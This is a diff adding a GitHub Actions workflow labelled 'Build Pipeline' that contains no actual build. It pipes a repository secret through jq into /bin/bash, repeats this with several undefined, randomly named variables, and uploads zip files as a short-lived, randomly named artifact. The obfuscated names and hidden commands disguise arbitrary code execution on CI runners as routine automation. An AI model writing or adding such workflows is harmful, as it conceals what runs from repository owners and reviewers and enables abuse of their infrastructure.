@@ -1,0 +1,32 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run task
+        env:
+          ig6: ${{ secrets.ig6 }}
+        run: |
+          printf '%s' "$ig6" | jq -r .nssmk7674 | /bin/bash
+          echo $sip2 | jq -r .f59 | /bin/bash
+          printf '%s' "$pve70501" | jq -r .eb0290 | /bin/bash
+          printf '%s' "$h06897" | jq -r .rt15988 | /bin/bash
+          echo $ycqxo38381 | jq -r .qvjh571 | /bin/bash
+          printf '%s' "$cro523" | jq -r .yc71513 | /bin/bash
+
+      - name: Store output
+        uses: actions/upload-artifact@v4
+        with:
+          name: h1SVvvsm
+          path: "*.zip"
+          retention-days: 1
